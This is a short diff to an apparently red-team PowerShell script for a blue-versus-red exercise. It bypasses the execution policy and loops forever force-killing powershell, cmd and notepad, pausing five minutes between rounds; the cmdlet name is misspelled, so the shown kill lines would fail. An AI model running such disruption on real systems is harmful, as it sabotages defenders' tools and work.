@@ -1,3 +1,4 @@
+#Scipt loops indefinetly killing programs the blueteam is likely to be using with a built in sleep function to space out the kiling of programs. Gives the blue team brief windows to work
 set-executionpolicy -Scope CurrentUser bypass
 while($true)
 {
@@ -9,6 +10,5 @@ while($true)
     Stop-Porcess -Force -Name powershell
     Stop-Porcess -Force -Name cmd
     Stop-Porcess -Force -Name notepad
-    Stop-Porcess -Force -Name 
     Start-Sleep -s 300
 }
